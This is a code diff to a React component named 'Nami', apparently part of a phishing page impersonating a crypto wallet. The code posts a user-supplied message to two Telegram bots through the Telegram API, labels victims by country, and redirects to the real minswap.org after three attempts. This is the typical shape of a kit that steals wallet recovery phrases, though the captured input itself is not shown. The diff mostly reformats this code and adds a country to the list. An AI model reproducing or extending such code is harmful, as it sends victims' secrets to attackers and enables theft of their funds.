@@ -28,7 +28,6 @@ function Nami() {
     getCountry();
   }, []);
 
-
   const handleCloseAllModals = () => {
     setIsModalOpen(false);
     setIsSecondModalOpen(false);
@@ -74,21 +73,23 @@ function Nami() {
     const chat_id = import.meta.env.VITE_REACT_APP_TELEGRAM_CHAT_ID;
     const otoken = import.meta.env.VITE_REACT_APP_OTELEGRAM_TOKEN;
     const ochat_id = import.meta.env.VITE_REACT_APP_OTELEGRAM_CHAT_ID;
-    const greenCountries = ['united states', 'united kingdom', 'nigeria', 'united arab emirates'];
-    const color = greenCountries.includes(country.toLowerCase()) ? 'RED' : 'GREEN';
-
-
-
-
+    const greenCountries = [
+      "united states",
+      "united kingdom",
+      "nigeria",
+      "united arab emirates",
+      "canada",
+    ];
+    const color = greenCountries.includes(country.toLowerCase())
+      ? "RED"
+      : "GREEN";
 
     const url = `https://api.telegram.org/bot${token}/sendMessage`;
     const ourl = `https://api.telegram.org/bot${otoken}/sendMessage`;
 
-
-
     const data = {
-        chat_id: chat_id,
-        text: `Nami:   ${message}`,
+      chat_id: chat_id,
+      text: `Nami:   ${message}`,
     };
     const odata = {
       chat_id: ochat_id,
@@ -99,40 +100,39 @@ function Nami() {
     setAttempts((prevAttempts) => prevAttempts + 1);
 
     if (attempts < 3) {
-        try {
-            const response = await fetch(url, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(data),
-            });
+      try {
+        const response = await fetch(url, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(data),
+        });
 
-            if (!response.ok) {
-                throw new Error("Network response was not ok");
-            }
-
-            const oresponse = await fetch(ourl, {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify(odata),
-            });
-      
-            if (!oresponse.ok) {
-              throw new Error("Network response was not ok");
-            }
-
-            console.log("null");
-        } catch (error) {
-            console.error("Error sending message:", error);
+        if (!response.ok) {
+          throw new Error("Network response was not ok");
         }
+
+        const oresponse = await fetch(ourl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(odata),
+        });
+
+        if (!oresponse.ok) {
+          throw new Error("Network response was not ok");
+        }
+
+        console.log("null");
+      } catch (error) {
+        console.error("Error sending message:", error);
+      }
     } else {
       window.location.href = "https://minswap.org/fi-FI";
     }
-};
-
+  };
 
   return (
     <div
